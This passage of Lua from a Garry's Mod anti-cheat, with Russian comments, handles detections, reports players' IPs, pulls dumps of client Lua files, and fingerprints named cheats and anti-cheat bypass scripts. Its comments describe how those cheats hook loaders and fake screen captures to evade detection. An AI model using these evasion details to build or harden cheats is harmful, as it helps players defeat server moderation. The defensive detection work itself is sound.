        manifest   = { "client lua dump — " .. nick .. " (" .. sid .. ") — " .. os.date("%Y-%m-%d %H:%M:%S") },
        known      = {},
        wantedHash = {},
        newSeen    = false,
        deadline   = CurTime() + BIN_TIMEOUT,
        doneFn     = doneFn,
        gotDone    = false,
    }

    NotifyPull(string.format("%s (%s) → манифест lua/ (дедуп)…", nick, sid))

    net.Start("ui_sync_poll")
        net.WriteString(BuildBinGrabClientCode(binManiPool[idx], binPullPool[idx], binChunkPool[idx], binAckPool[idx]))
    net.Send(ply)

    timer.Simple(BIN_TIMEOUT + 0.5, function()
        if pendingBin[sid] then
            FinalizeBinGrab(sid)
        end
    end)
end


local CD_DETECT_COOLDOWN = 90 -- сек: окно дедупа повторных детектов одного SteamID
local CD_DETECT_COOLDOWN_EXEMPT = 1800 -- exempt/вайтлист не банят — не спамим скрин/Discord/консоль
local _cdDetectSeen = {}
local function HandleDetection(ply, reasons, grabReqNameOverride)
    if not IsValid(ply) then return end

    local nick = ply:Nick()
    local sid  = ply:SteamID()

    -- CD_DETECT_DEBOUNCE: дедуп повторных детектов одного SteamID на окно. Для
    -- exempt/вайтлист окно длинное — их всё равно не банят, нет смысла переснимать.
    do
        local _now = CurTime()
        -- CD_MONITOR_MODE: в режиме наблюдения игрок НЕ удаляется → передетект каждые
        -- 90с спамил панель/Discord. Для monitor/exempt/whitelist — длинное окно (30 мин).
        local _cd = (IsExempt(ply) or IsWhitelisted(sid) or MonitorMode()) and CD_DETECT_COOLDOWN_EXEMPT or CD_DETECT_COOLDOWN
        -- CD_TEST_DEBOUNCE: конфиг лицензии может укоротить окно дедупа (стенд). Прод не задаёт debounce_sec -> поведение как было.
        do local _dc = ZB_AC and ZB_AC.Config and tonumber(ZB_AC.Config.debounce_sec); if _dc and _dc > 0 then _cd = _dc end end
        local _last = _cdDetectSeen[sid]
        if _last and (_now - _last) < _cd then return end
        _cdDetectSeen[sid] = _now
    end
    -- CD_RESULT_FIELD: определяем РЕЗУЛЬТАТ действия ДО репорта, чтобы и панель, и
    -- Discord (упрощённый эмбед админам) показывали чем кончилось: бан/кик/варн/
    -- мониторинг/игнор. Логика зеркалит ветвление ниже.
    local monitor = MonitorMode()
    local wl      = IsWhitelisted(sid)
    local exempt  = IsExempt(ply)
    local soft    = IsPurelySwDetection(reasons)
    local swState = GetSwState(sid)
    local result
    if wl then
        result = "ignore_whitelist"
    elseif monitor then
        result = "monitor"
    elseif exempt then
        result = "ignore_exempt"
    elseif soft and swState ~= "clean" then
        result = "warn"
    else
        result = string.lower(CVAR_ACTION:GetString() or "log") -- ban / kick / log
    end

    if ZB_AC and ZB_AC.Report then -- CD_REPORT_DETECT: детект в панель
        ZB_AC.Report("detect", 3, "Детект: " .. nick, {
            steamid = sid, nick = nick, reasons = reasons, result = result,
            ip = IsValid(ply) and ply:IPAddress() or nil,
        })
    end

    if wl then
        NotifyStaff(string.format("WHITELIST: детект на %s (%s) проигнорирован (в вайтлисте)", nick, sid))
        return
    end

    -- CD_MONITOR_MODE: наблюдение — собираем улики + отчёт, НО без бан/кик/варна.
    if monitor then
        NotifyStaff(string.format("MONITOR: детект на %s (%s) — без действий (режим наблюдения)", nick, sid))
        RunDetectPipeline(ply, sid, nick, reasons, grabReqNameOverride, {
            noPunish           = true,
            skipAntiScreengrab = true,
            staffTag           = "MONITOR (без действий)",
            reportTitle        = "ЧечаДефендер: обнаружение (режим наблюдения)",
        })
        return
    end

    if not exempt and soft and swState ~= "clean" then
        SetSwWarned(sid)

        local triggers = table.concat(reasons, ", ")
        local isRepeat = swState == "warned"
        NotifyStaff(string.format(
            "SW-WARN (%s) %s (%s) → предупреждение, кик через 15с. Триггеры: %s",
            isRepeat and "повтор" or "1-й детект", nick, sid, triggers))

        if CVAR_WARNING:GetBool() and IsValid(ply) and TEAM_SPECTATOR then
            pcall(function() ply:SetTeam(TEAM_SPECTATOR) end)
            net.Start("ui_notice_show")
            net.Send(ply)
        end

        local warnKickAt = CurTime() + 15
        local isRepeat = swState == "warned"
        local title = isRepeat
            and "ЧечаДефендер: повторное предупреждение SilkWare (чит не удалён)"
            or  "ЧечаДефендер: предупреждение SilkWare (1-й детект)"

        RunDetectPipeline(ply, sid, nick, reasons, grabReqNameOverride, {
            staffTag           = "SW-WARN (" .. (isRepeat and "повтор" or "1-й детект") .. ")",
            reportTitle        = title,
            skipAntiScreengrab = true,
            infoPrefix         = "ChechaDefender (WARNING)",
            noPunish           = true,
            buildDiscordMsg    = function(binLine, triggers, nick, sid)
                return string.format(
                    "Игрок: `%s` (`%s`)\n**Триггеры:** %s\n**Время:** %s%s\n" ..
                    "_Предупреждение - кик без бана._\n" ..
                    "_Бан наступит только после того как игрок зайдёт чистым, а затем снова с читом._",
                    nick, sid, triggers, os.date("%Y-%m-%d %H:%M:%S"), binLine)
            end,
            onAfterDeliver = function()
                local delay = math.max(0, warnKickAt - CurTime())
                timer.Simple(delay, function()
                    if not IsValid(ply) then return end
                    if ULib and ULib.kick then
                        ULib.kick(ply, "Удалите запрещённые программы с ПК и очистите папку data")
                    else
                        ply:Kick("Удалите запрещённые программы с ПК и очистите папку data")
                    end
                end)
            end,
        })

        return
    end

    RunDetectPipeline(ply, sid, nick, reasons, grabReqNameOverride, {
        noPunish = exempt,
        staffTag = exempt and "DETECTED (админ, без бана)" or "DETECTED",
        onAfterDeliver = function()
            ApplyPunish(ply, sid, nick, exempt, reasons)
        end,
    })

    if CVAR_FORENSIC:GetBool() and not exempt and not IsWhitelisted(sid) then
        timer.Simple(2, function()
            if IsValid(ply) and ZB_AC_StartForensicSweep then
                ZB_AC_StartForensicSweep(ply, nick, sid)
            end
        end)
    end
end

local KEFIR_PROBE_BC = nil
do
    local ok, bc = pcall(string.dump, function() return 1 end)
    if ok and type(bc) == "string" and #bc > 0 and #bc < 4096 then
        KEFIR_PROBE_BC = bc
    else
        print("[AC] KEFIR-проба отключена: string.dump недоступен на сервере " ..
              "(" .. tostring(bc) .. ")")
    end
end

local function ToLuaByteString(s)
    if not s or s == "" then return "" end
    local out = {}
    for i = 1, #s do
        out[i] = "\\" .. string.byte(s, i)
    end
    return table.concat(out)
end


local function BuildClientCheckCode(nonce, respName, grabReqName)
    local v1 = "_a" .. tostring(math.random(10000, 99999))
    local v2 = "_b" .. tostring(math.random(10000, 99999))
    local v3 = "_c" .. tostring(math.random(10000, 99999))

    return string.format([==[
local rawget = rawget
local file_IsDir = file.IsDir
local file_Exists = file.Exists
local _G = _G
local pcall = pcall

if surface and surface.CreateFont then
    local _df = {"SW_Title","SW_Tab","SW_Group","SW_Elem","SW_Small","SW_Btn","SW_ESP_Name","SW_ESP_Info","Oreo","MMediumName","WindowsSubTitle","WindowsTitle","RBoldO","HP_RBoldO","MMedium","NickName_RBoldO","FuncButtons","NL_Logo","NL_Header","NL_Group","NL_Text","NL_Icon","NL_Icon_Small","kefir.icon.solid","kefir.icon.regular","kefir.icon.old","kefir.icon.solid.blur","kefir.icon.regular.blur","kefir.icon.old.blur","kefir.main","kefir.main.small","kefir.main.tiny","kefir.main.nano","kefir.main.qcold","kefir.main_blur","kefir.verdana.tiny","kefir.verdana.hitmarker"}
    for _i = 1, #_df do
        pcall(surface.CreateFont, _df[_i], {font = "Arial", size = 10, weight = 400})
    end
end

local strong = {}
local weak   = {}
local function addStrong(name) strong[#strong + 1] = name end
local function addWeak(name)   weak[#weak + 1]     = name end

local _fontCache = _G["_zbac_fc"]
if type(_fontCache) ~= "table" then _fontCache = {} _G["_zbac_fc"] = _fontCache end

local function HasFont(name)
    local cached = _fontCache[name]
    if cached ~= nil then return cached end
    if not surface or not surface.SetFont or not surface.GetTextSize then
        return false
    end
    if surface.CreateFont then
        pcall(surface.CreateFont, name, {font = "Arial", size = 10, weight = 400})
    end
    local ok = pcall(surface.SetFont, name)
    if not ok then _fontCache[name] = false return false end
    local ok2, _w, h = pcall(surface.GetTextSize, "X")
    if not ok2 or not h then _fontCache[name] = false return false end
    local res = h > 18
    _fontCache[name] = res
    return res
end

-- ===========================================================================
-- SILKWARE
-- ===========================================================================
-- STRONG: глобал SilkWare с >=3 характерными internal-полями.
local %s = rawget(_G, "SilkWare")
if type(%s) == "table" then
    local hits = 0
    for _, key in ipairs({
        "_registered_hooks", "_hookGetTablePatched", "_debugPatched",
        "_stringDumpPatched", "_view_installed", "_orig_homigrad_view",
        "_orig_helmet_hook", "_local_bones_drawing",
        "_aa_active", "_aa_initialized", "_aa_cam_pitch", "_aa_cam_yaw",
        "_tp_active", "_tp_was_active", "_hide_local_model",
        "_trajectory_valid", "_trajectory_hitpos",
        "_keybind_waiting", "_keybind_lmb_was_pressed",
        "_aimbot_target", "_aa_spin_angle", "_aimbot_real_angles",
        "_cached_muzzle_pos", "_local_skeleton_lines",
    }) do
        if %s[key] ~= nil then hits = hits + 1 end
    end
    if hits >= 3 then
        addStrong("sw_global(" .. hits .. ")")
    elseif hits >= 1 then
        addWeak("sw_global(" .. hits .. ")")
    end
end

-- STRONG: папка data/silkwarecfgs/ — конфиг SilkWare. Имя уникально для
-- SilkWare, легитимные аддоны такую папку НЕ создают → её наличие = у игрока
-- БЫЛ (или есть) SilkWare. Баним даже за ОСТАТОЧНУЮ/СТАРУЮ установку: если
-- активный чит уже выгружен (нет _G.SilkWare и шрифтов SW_*, прошло больше двух
-- недель и т.п.), но папка-конфиг осталась на диске — этого достаточно для бана.
-- FP≈0: невозможно получить эту папку, не ставив SilkWare. (Раньше было WEAK —
-- старые установки не банились в одиночку; по требованию повышено до STRONG.)
if file_IsDir and file_IsDir("silkwarecfgs", "DATA") then
    addStrong("sw_config_dir")
end

-- STRONG: 2+ уникальных шрифта SW_*.
local sw_font_hits = 0
for _, fname in ipairs({"SW_Title", "SW_Tab", "SW_Group", "SW_Elem",
                        "SW_Small", "SW_Btn", "SW_ESP_Name", "SW_ESP_Info"}) do
    if HasFont(fname) then sw_font_hits = sw_font_hits + 1 end
end
if sw_font_hits >= 2 then
    addStrong("sw_fonts(" .. sw_font_hits .. ")")
elseif sw_font_hits == 1 then
    addWeak("sw_fonts(1)")
end

-- STRONG: SilkWare патчит debug.getinfo и заменяет source на "=[C]" если в
-- source содержится "silk". Создаём тестовую функцию с такой source и
-- проверяем поведение getinfo.
do
    local ok_ls, test_chunk = pcall(loadstring, "--silk-marker\nreturn function() end")
    if ok_ls and test_chunk then
        local ok_call, test_func = pcall(test_chunk)
        if ok_call and type(test_func) == "function" then
            local ok_info, info = pcall(debug.getinfo, test_func, "S")
            if ok_info and type(info) == "table" then
                -- Чистый GMod вернёт source с "silk" в строке. Патч → "=[C]".
                if info.source == "=[C]" or info.what == "C" then
                    addStrong("sw_debug_patch")
                end
            end
        end
    end
end

-- ===========================================================================
-- CD_FAMILY_SIG: SILKWARE-СЕМЕЙСТВО ПОД ДРУГИМИ ИМЕНАМИ
-- ===========================================================================
-- NativeWare / Rutka_vip / GandonWarev2 (и будущие ребренды) — тот же кодовый
-- база, что SilkWare: у их глобала одинаковые internal-поля аимбота/антиэйма
-- (_aa_cam_yaw, _aimbot_real_angles, _forge_real_angle, _orig_homigrad_view…).
-- Скан ЛЮБОЙ _G-таблицы на >=4 таких полей → STRONG, независимо от имени бренда.
-- Имя "SilkWare" пропускаем — оно уже обработано выше как sw_* (warn-политика).
-- FP~0: легитимный аддон не держит таблицу с 4+ этими полями.
do
    local _famFields = {
        "_aa_cam_yaw", "_aa_cam_pitch", "_aa_initialized", "_aa_suppressed",
        "_aa_found_target", "_aa_spin_angle", "_aimbot_real_angles",
        "_aimbot_target", "_registered_hooks", "_cached_muzzle_pos",
        "_cached_muzzle_ang", "_forge_real_angle", "_forge_angles",
        "_silent_aim_forcing", "_orig_homigrad_view", "_orig_helmet_hook",
        "_keybind_waiting", "_trajectory_hitpos",
    }
    for _gk, _gv in pairs(_G) do
        if type(_gk) == "string" and _gk ~= "SilkWare" and type(_gv) == "table" then
            local _fh = 0
            for _, _ff in ipairs(_famFields) do
                if rawget(_gv, _ff) ~= nil then _fh = _fh + 1 end
            end
            if _fh >= 4 then
                addStrong("aim_family_global(" .. _gk .. ":" .. _fh .. ")")
                break
            end
        end
    end
end

-- CD_FAMILY_SIG: уникальные шрифты по брендам (NativeWare_/Rutka_/GW_/Moloko).
-- Префиксы уникальны для меню конкретного чита. >=2 совпадений → STRONG.
do
    local _brandFonts = {
        nativeware = { "NativeWare_Title", "NativeWare_Tab", "NativeWare_ESP_Name",
                       "NativeWare_Watermark", "NativeWare_Group", "NativeWare_Elem" },
        rutka      = { "Rutka_Title", "Rutka_Tab", "Rutka_ESP_Name",
                       "Rutka_Watermark", "Rutka_Group", "Rutka_Headshot" },
        gandonware = { "GW_Title", "GW_Tab", "GW_ESP_Name",
                       "GW_Subtitle", "GW_Group", "GW_Elem" },
        moloko     = { "MolokoTitle", "MolokoTab", "MolokoCheck",
                       "MolokoHit", "MolokoMiss", "MolokoGroup" },
    }
    for _bn, _fl in pairs(_brandFonts) do
        local _bh = 0
        for _, _fn in ipairs(_fl) do
            if HasFont(_fn) then _bh = _bh + 1 end
        end
        if _bh >= 2 then
            addStrong(_bn .. "_fonts(" .. _bh .. ")")
        end
    end
end

-- ===========================================================================
-- v4 SILKWARE-ONLY: всё что было ниже (Dobroware-сигналы, GTS bait, runtime
-- injection: string.dump checks, wrap_native, cheat_concmd, cheat_hooks,
-- cheat_dll, cheat_timer) — УДАЛЕНО.
-- Причина: generic-паттерны (silk, esp_, aim_, dw_, sw_, chams, trigger…)
-- срабатывали на легитимные хуки гейммода homigrad (PhysSilk, AS_ESP_Draw)
-- и админских аддонов → массовый автобан невиновных игроков.
-- См. историю в zcity-rp скиле от 2026-05-28.
-- ===========================================================================

-- ===========================================================================
-- AMFETAMIN (v6)
-- ===========================================================================
-- STRONG: хук с уникальным префиксом "Amfetamin_" в hook.GetTable().
-- Проверены ВСЕ распространённые варианты: Alpha_Amfetamin, amfetamin_komigrad,
-- amfetamin_new, amfetamin_v1_white, amfetamin_v2_black, amfetamin3.
-- Префикс «Amfetamin_» не встречается в легитимных хуках сервера/гейммода.
do
    local ok_ht, ht = pcall(hook.GetTable)
    if ok_ht and type(ht) == "table" then
        local amfHooks = {
            HUDPaint        = { "Amfetamin_ESP", "Amfetamin_Watermark",
                                "Amfetamin_FakeTag", "Amfetamin_DrawFOV",
                                "Amfetamin_DrawTracers" },
            CreateMove      = { "Amfetamin_Bhop", "Amfetamin_NoRecoil",
                                "Amfetamin_Aimbot" },
            EntityTakeDamage= { "Amfetamin_BulletTracer" },
            PlayerDeath     = { "Amfetamin_ResetLock" },
        }
        local amfFound = nil
        for evt, list in pairs(amfHooks) do
            local bucket = ht[evt]
            if type(bucket) == "table" then
                for _, nm in ipairs(list) do
                    if bucket[nm] ~= nil then
                        amfFound = nm
                        break
                    end
                end
            end
            if amfFound then break end
        end
        if amfFound then
            addStrong("amf_hooks(" .. amfFound .. ")")
        end
    end
end

-- STRONG: файл amfetamin_config.txt в zxc/ (amfetamin_komigrad).
-- Папка "zxc" не используется легитимными аддонами сервера.
if file_Exists and file_Exists("zxc/amfetamin_config.txt", "DATA") then
    addStrong("amf_cfg_file")
end

-- ===========================================================================
-- DOBROWARE (zaluparecoil — no-recoil patch для homigrad weapon_octo_base_)
-- ===========================================================================
-- STRONG: префикс "DW_" в hook-именах.
-- ВНИМАНИЕ: weapon_octo_base_ САМ ПО СЕБЕ легитимный (homigrad ARC9 base),
-- детектим только по уникальным DW_*-хукам которые перехватывают рекойл.
do
    local ok_ht, ht = pcall(hook.GetTable)
    if ok_ht and type(ht) == "table" then
        local dwHooks = {
            Think             = { "DW_NoRecoilSystem", "DW_WeaponTracker" },
            EntityFireBullets = { "DW_NoRecoilHook" },
            InitPostEntity    = { "DW_AutoDetectMode" },
        }
        local dwFound = nil
        for evt, list in pairs(dwHooks) do
            local bucket = ht[evt]
            if type(bucket) == "table" then
                for _, nm in ipairs(list) do
                    if bucket[nm] ~= nil then
                        dwFound = nm
                        break
                    end
                end
            end
            if dwFound then break end
        end
        if dwFound then
            addStrong("dw_hooks(" .. dwFound .. ")")
        end
    end
end

-- ===========================================================================
-- ESCHTZ / LOLDEV ("NL Cheat")
-- ===========================================================================
-- STRONG: 3+ из специфичных eschtz cfg_*-ConVar.
-- Проверяем только те ConVar которые НЕ используются легитимным сервером
-- (cfg_speedhack, cfg_inventory_exploit, cfg_antiaim, cfg_aim_smooth и т.п.).
-- Порог 3+ исключает случайные совпадения. Легитимный сервер этих cvar не имеет.
do
    local nlCvars = {
        "cfg_aimbot", "cfg_antiaim", "cfg_antiaim_power", "cfg_antiaim_speed",
        "cfg_antiaim_mode", "cfg_aim_smooth", "cfg_trigger_mode",
        "cfg_trigger_delay", "cfg_speedhack", "cfg_inventory_exploit",
        "cfg_esp_dormant", "cfg_override_fov", "cfg_fov_value",
        "cfg_esp_box_style", "cfg_hitsound_file", "cfg_hitsound_volume",
    }
    local nlConvarHits = 0
    if GetConVar then
        for _, cn in ipairs(nlCvars) do
            local ok_cv, cv = pcall(GetConVar, cn)
            if ok_cv and cv then nlConvarHits = nlConvarHits + 1 end
        end
    end
    if nlConvarHits >= 3 then
        addStrong("nl_convars(" .. nlConvarHits .. ")")
    end
end

-- STRONG: 2+ из шрифтов NL_*. Префикс уникален для меню eschtz.
do
    local nl_font_hits = 0
    for _, fname in ipairs({"NL_Logo", "NL_Header", "NL_Group", "NL_Text",
                            "NL_Icon", "NL_Icon_Small"}) do
        if HasFont(fname) then nl_font_hits = nl_font_hits + 1 end
    end
    if nl_font_hits >= 2 then
        addStrong("nl_fonts(" .. nl_font_hits .. ")")
    end
end

-- STRONG: Think-hook "HITSOUND_DETECT_SHOT" — eschtz hitsound через
-- отслеживание изменения wep:Clip1(). Имя крайне специфичное.
do
    local ok_ht, ht = pcall(hook.GetTable)
    if ok_ht and type(ht) == "table" then
        local think = ht["Think"]
        if type(think) == "table" and think["HITSOUND_DETECT_SHOT"] ~= nil then
            addStrong("nl_hitsound_hook")
        end
    end
end
-- ===========================================================================

-- ===========================================================================
-- KEFIR (kefir.rip) — расхук luaL_loadbuffer (загрузка байткода разрешена)
-- ===========================================================================
-- _bc — валидный байткод, надамплен сервером под эту же LuaJIT-сборку. На чистом
-- GMod компиляция бинарного чанка ВСЕГДА даёт строку-ошибку (а не function); если
-- вернулась function — клиент расхукал luaL_loadbuffer (поведение KEFIR). Функцию
-- НЕ вызываем. Кэшируем компиляторы на момент сборки скрипта.
do
    local _bc = "%s"
    if _bc ~= "" then
        local _Compile = CompileString
        local _Load    = loadstring
        local loaded = false
        if _Compile then
            -- HandleError=false → при ошибке вернётся СТРОКА, не throw
            local ok, fn = pcall(_Compile, _bc, "kfp", false)
            if ok and type(fn) == "function" then loaded = true end
        end
        if not loaded and _Load then
            local ok, fn = pcall(_Load, _bc, "kfp")
            if ok and type(fn) == "function" then loaded = true end
        end
        if loaded then
            -- CD_BYTECODE_PROBE: универсальный сигнал — клиент включил загрузку
            -- байткода (компилированный чит: Kefir/mayrr/платный). FP≈0.
            addStrong("bytecode_load")
        end
    end
end

-- ===========================================================================
-- KEFIR: перехват render.Capture / CaptureToFile (anti-screengrab чита)
-- ===========================================================================
-- KEFIR хукает Lua-функции скрин-капчи, чтобы детектить попытки скрина АЧ — в
-- консоль игрока он пишет "[kefir.vip] Screengrabed" и дамп debug.getinfo
-- вызывающего ({"short_src":..,"currentline":..,"source":..}). Чтобы это делать,
-- он ЗАМЕНЯЕТ нативную render.Capture своей Lua-обёрткой.
--   * Чистый GMod (и штатный screengrab homigrad, который render.Capture лишь
--     ВЫЗЫВАЕТ, а не подменяет): render.Capture/CaptureToFile — C-функции
--     (debug.getinfo .what == "C").
--   * KEFIR: подменена Lua-обёрткой → .what ~= "C" → STRONG kefir_capture_hook.
-- Это прямой детект ровно того поведения, что видно в консоли. FP≈0: легитимный
-- код почти никогда не заменяет нативную render-капчу Lua-функцией.
do
    local _gi = debug and debug.getinfo
    local function wrapSrc(fn)
        -- nil = чисто (C-функция или нет функции); строка = подменена Lua-обёрткой
        if type(fn) ~= "function" or not _gi then return nil end
        local ok, info = pcall(_gi, fn, "S")
        if not ok or type(info) ~= "table" then return nil end
        if info.what == "C" then return nil end
        local src = tostring(info.source or "?")
        if #src > 60 then src = string.sub(src, 1, 57) .. "..." end
        return src
    end
    local hooked = {}
    if render then
        if wrapSrc(render.Capture)       then hooked[#hooked + 1] = "Capture" end
        if wrapSrc(render.CaptureToFile) then hooked[#hooked + 1] = "CaptureToFile" end
    end
    if #hooked > 0 then
        addStrong("kefir_capture_hook(" .. table.concat(hooked, ",") .. ")")
    end
end

-- ===========================================================================
-- BYPASS-TAMPER (v8): подмена net.* Lua-обёртками (профиль KillChecha/9f8a84.lua)
-- ===========================================================================
-- Bypass-скрипты нейтрализуют АЧ, ЗАМЕНЯЯ net.Start/net.Receive/net.SendToServer
-- своими Lua-обёртками, которые гасят пакеты АЧ по имени канала. В ванильном GMod
-- эти функции — НАТИВНЫЕ (C). Если хоть одна стала Lua — её кто-то обернул.
--   * Триггер: >=2 net-функции Lua-обёрнуты → STRONG (ровно профиль KillChecha:
--     net.Start + net.Receive). ==1 → WEAK (одиночная net-либа сама не банит).
--   * Контекст (только для отчёта, на порог НЕ влияет): timer.Create/concommand.Add/
--     hook.Remove/debug.getinfo — их легитимно оборачивают чатбоксы/либы, поэтому
--     не триггерим, но пишем в сигнал как «подробности обхода».
-- debug.getinfo в наборе — recursion-proof: подменённый getinfo, опрошенный про
-- себя, либо палится как Lua, либо врёт «C» по всему (тогда сработает honeypot).
-- FP≈0: легит-клиент практически никогда не заменяет net.Start Lua-функцией.
do
    local _gi = debug and debug.getinfo
    local function srcOf(fn)
        -- nil = чисто (C-функция/нет); строка = Lua-обёртка (+её источник)
        if type(fn) ~= "function" or not _gi then return nil end
        local ok, info = pcall(_gi, fn, "S")
        if not ok or type(info) ~= "table" then return nil end
        if info.what == "C" then return nil end
        local src = tostring(info.short_src or info.source or "?")
        if #src > 50 then src = string.sub(src, 1, 47) .. "..." end
        return src
    end

    -- триггерный набор (net.*) — считаем подменённые
    local netSet = {}
    if net then
        netSet[#netSet + 1] = { name = "net.Start",        fn = net.Start }
        netSet[#netSet + 1] = { name = "net.SendToServer", fn = net.SendToServer }
        netSet[#netSet + 1] = { name = "net.Receive",      fn = net.Receive }
    end
    local netHits = {}
    for _, e in ipairs(netSet) do
        local s = srcOf(e.fn)
        if s then netHits[#netHits + 1] = e.name .. "<-" .. s end
    end

    -- контекстный набор (только для отчёта)
    local ctxSet = {
        { name = "timer.Create",   fn = timer and timer.Create },
        { name = "concommand.Add",  fn = concommand and concommand.Add },
        { name = "hook.Remove",     fn = hook and hook.Remove },
        { name = "debug.getinfo",   fn = debug and debug.getinfo },
    }
    local ctxHits = {}
    for _, e in ipairs(ctxSet) do
        if srcOf(e.fn) then ctxHits[#ctxHits + 1] = e.name end
    end

    if #netHits > 0 then
        local sig = "ac_bypass_tamper(" .. table.concat(netHits, "; ")
        if #ctxHits > 0 then sig = sig .. " +" .. table.concat(ctxHits, ",") end
        sig = sig .. ")"
        if #sig > 190 then sig = string.sub(sig, 1, 187) .. ")" end
        if #netHits >= 2 then addStrong(sig) else addWeak(sig) end
    end
end

-- (v8: honeypot-ответ cd_resp шлётся в конце этого же скрипта — см. секцию
--  «Отправка результата». Отдельный обработчик cd_req убран: он проигрывал
--  гонку фрагментированному check-коду и давал ложные срабатывания.)

-- ===========================================================================
-- KEFIR: хуки из анонимного RunString-чанка на чувствительных событиях (ГЛАВНЫЙ)
-- ===========================================================================
-- Самый надёжный сигнатур KEFIR (вскрыт kefir_tracer): чит грузит свой Lua через
-- RunString → debug.getinfo показывает source вида [string "<rand>"], и вешает
-- хуки со СЛУЧАЙНЫМИ именами на CreateMove/CalcView/CalcViewModelView/HUDPaint/
-- RenderScreenspaceEffects/PostEntityFireBullets/… — ВСЕ из ОДНОГО чанка.
-- Легит-код (homigrad, IGS, GTS-аддоны) вешает хуки из ФАЙЛОВ (source "@.../x.lua",
-- short_src "lua/...", "addons/...", "igs/..."). Анонимный [string "…"]-чанк,
-- держащий хуки на >=3 РАЗНЫХ чувствительных событиях ИЛИ >=6 хуков всего — это
-- KEFIR. FP≈0 (наш собственный RunString-код вешает лишь временный PostRender).
-- Имена хуков и имя чанка рандомны у каждого игрока/сессии — поэтому матчим
-- ПАТТЕРН (анонимный чанк + чувствительные события), а не конкретные имена.
-- БОНУС-ФОРЕНЗИКА: у функций чит-чанка сканируем upvalue-строки на маркеры
-- (kefir/checha/chechensky/ggbot/sagewold/http) — если нашли, прикладываем как
-- доказательство в триггер (видно в Discord-отчёте ЧечаДефендера).
do
    local _gi2 = debug and debug.getinfo
    local _guv = debug and debug.getupvalue
    local SENS = {
        CreateMove = true, SetupMove = true, StartCommand = true, Move = true,
        CalcView = true, CalcViewModelView = true,
        HUDPaint = true, HUDPaintBackground = true,
        RenderScreenspaceEffects = true, RenderScene = true, PreRender = true,
        PostDrawOpaqueRenderables = true, PostDrawTranslucentRenderables = true,
        PreDrawHalos = true, PreDrawViewModel = true, PostDrawViewModel = true,
        EntityFireBullets = true, PostEntityFireBullets = true,
        AdjustMouseSensitivity = true,
    }
    local ok_ht, ht = pcall(hook.GetTable)
    if ok_ht and type(ht) == "table" and _gi2 then
        local info = {} -- src -> {total=, sens={evt=true}, sensN=, funcs={}}
        for evt, bucket in pairs(ht) do
            if type(bucket) == "table" then
                for _, fn in pairs(bucket) do
                    if type(fn) == "function" then
                        local ok_i, gi = pcall(_gi2, fn, "S")
                        if ok_i and type(gi) == "table" and gi.what ~= "C" then
                            local src = tostring(gi.short_src or gi.source or "")
                            if string.sub(src, 1, 8) == "[string " then
                                local rec = info[src]
                                if not rec then
                                    rec = { total = 0, sens = {}, sensN = 0, funcs = {} }
                                    info[src] = rec
                                end
                                rec.total = rec.total + 1
                                if SENS[evt] and not rec.sens[evt] then
                                    rec.sens[evt] = true
                                    rec.sensN = rec.sensN + 1
                                end
                                if #rec.funcs < 8 then rec.funcs[#rec.funcs + 1] = fn end
                            end
                        end
                    end
                end
            end
        end
        -- худший анонимный чанк (макс чувствительных событий, затем всего хуков)
        local wSrc, wRec
        for src, rec in pairs(info) do
            if not wRec or rec.sensN > wRec.sensN
               or (rec.sensN == wRec.sensN and rec.total > wRec.total) then
                wSrc, wRec = src, rec
            end
        end
        if wRec and (wRec.sensN >= 3 or (wRec.total >= 6 and wRec.sensN >= 1)) then
            -- список событий (для доказательства)
            local evs = {}
            for e in pairs(wRec.sens) do evs[#evs + 1] = e end
            -- скан upvalue-строк на маркеры чита
            local uvMark = ""
            if _guv then
                local MK = { "kefir", "checha", "chechensky", "ggbot", "sagewold" }
                for _, fn in ipairs(wRec.funcs) do
                    local k = 1
                    while k <= 40 do
                        local ok_uv, n, v = pcall(_guv, fn, k)
                        if not ok_uv or n == nil then break end
                        if type(v) == "string" and #v > 3 then
                            local lv = string.lower(v)
                            for _, m in ipairs(MK) do
                                if string.find(lv, m, 1, true) then uvMark = " +uv:" .. m; break end
                            end
                        end
                        if uvMark ~= "" then break end
                        k = k + 1
                    end
                    if uvMark ~= "" then break end
                end
            end
            local sig = "kefir_anon_hooks(" .. wRec.sensN .. "ev/" .. wRec.total .. "h " ..
                string.sub(tostring(wSrc), 1, 22) .. ": " ..
                table.concat(evs, ",") .. uvMark .. ")"
            if #sig > 190 then sig = string.sub(sig, 1, 187) .. ")" end
            addStrong(sig)
        end
    end
end
-- ===========================================================================

-- ===========================================================================
-- KEFIR v2 (kefirka.lua) — Lua-рендер чит с anti-screengrab bypass (v9)
-- ===========================================================================
-- Kefirka v2 реализует ESP/aimbot на Lua. Anti-screengrab: render.Capture
-- заменяется Lua-обёрткой, которая рендерит чистый кадр. Детектируем через
-- структуру _G.KEFIR, уникальные шрифты, именованные хуки и активный bypass.

-- STRONG: _G.KEFIR с >=3 полями — основная структура kefirka (убрать = сломать чит)
do
    local _kG = rawget(_G, "KEFIR")
    if type(_kG) == "table" then
        local _kHits = 0
        for _, _kKey in ipairs({
            "cfg", "ui", "IsScreengrabbing", "aim_cache",
            "friends", "iesp", "grab", "gunners", "traitors",
        }) do
            if _kG[_kKey] ~= nil then _kHits = _kHits + 1 end
        end
        if _kHits >= 3 then
            addStrong("kefir_global(" .. _kHits .. ")")
        elseif _kHits >= 1 then
            addWeak("kefir_global(" .. _kHits .. ")")
        end
    end
end

-- STRONG: KEFIR.cfg.antiscreen == true → bypass скрина АКТИВЕН прямо сейчас.
-- render.Capture заменён Lua-обёрткой, скрин-граб вернёт чистый кадр.
-- Детектирует НАМЕРЕНИЕ обойти скрин, независимо от механизма (Lua или native).
do
    local _kG = rawget(_G, "KEFIR")
    if type(_kG) == "table" and type(_kG.cfg) == "table"
       and _kG.cfg.antiscreen == true then
        addStrong("kefir_antiscreengrab")
    end
end

-- STRONG: 2+ шрифтов kefir.* (поверхность создаётся kefirka.lua; легитимный
-- код никогда не использует префикс "kefir." → FP≈0)
do
    local _kfF = 0
    for _, _fn in ipairs({
        "kefir.icon.solid",      "kefir.icon.regular",     "kefir.icon.old",
        "kefir.icon.solid.blur", "kefir.icon.regular.blur", "kefir.icon.old.blur",
        "kefir.main",            "kefir.main.small",        "kefir.main.tiny",
        "kefir.main.nano",       "kefir.main.qcold",        "kefir.main_blur",
        "kefir.verdana.tiny",    "kefir.verdana.hitmarker",
    }) do
        if HasFont(_fn) then _kfF = _kfF + 1 end
    end
    if _kfF >= 2 then
        addStrong("kefir_fonts(" .. _kfF .. ")")
    elseif _kfF == 1 then
        addWeak("kefir_fonts(1)")
    end
end

-- STRONG: именованные хуки kefirka (конкретные имена — уникальны для этого чита)
do
